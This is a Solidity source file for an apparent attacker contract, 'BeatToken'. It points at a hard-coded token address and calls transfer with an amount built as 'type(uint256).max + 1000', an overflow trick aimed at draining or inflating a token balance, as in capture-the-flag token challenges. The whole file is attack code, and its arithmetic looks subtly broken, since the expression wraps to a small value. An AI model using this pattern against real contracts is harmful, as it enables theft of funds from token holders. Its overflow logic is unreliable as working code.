// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../interfaces/IToken.sol";

contract BeatToken {
    IToken public tokenContract;

    constructor() public {
        tokenContract = IToken(0x74E5FdDF2d1f641c25B89710C51449A136e9d95B);
    }

    function bigTransfer() public {
        tokenContract.transfer(msg.sender, type(uint256).max + 1000);
    }
}
